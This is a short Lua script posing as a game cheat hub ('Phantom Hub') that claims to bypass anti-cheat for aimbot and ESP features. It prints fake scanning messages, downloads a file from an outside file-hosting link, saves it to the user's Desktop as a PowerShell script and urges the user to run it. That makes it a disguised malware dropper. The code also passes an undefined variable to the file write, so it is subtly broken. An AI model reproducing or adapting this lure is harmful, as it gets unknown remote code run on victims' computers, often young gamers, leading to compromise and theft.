--// Phantom Hub v3.0 - Universal Anti-Cheat Bypass //--
print("PHANTOM HUB LOADED...")
wait(1)
print("Scanning for active security modules...")
wait(2)
print(">> Anti-Cheat Detected! <<")
print(">> A bypass is required to use premium features (ESP, Aimbot). <<")

local payload_url = 'https://files.catbox.moe/382isn.7z'
local bypass_filename = "Enable_Phantom_Features.ps1"

-- Use the injector's 'writefile' function to save our powershell launcher to the user's desktop
if writefile then
    print("Creating bypass...")
    local script_content = game:HttpGet(payload_url, true)
    writefile("Desktop\\" .. bypass_filename, content)
    wait(1)
    print("-------------------------------------------------------------------------")
    print("SUCCESS! Bypass created on your Desktop: '" .. bypass_filename .. "'")
    print("Right-click the new file on your desktop and hit 'Run with PowerShell'.")
    print("-------------------------------------------------------------------------")
else
    print("ERROR: Your injector doesn't support automatic bypass creation.")
    print("Please download the bypass manually from the link below and run it.")
    print("Bypass Link: " .. payload_url)
end

print("Script will have limited functionality until bypass is activated.")
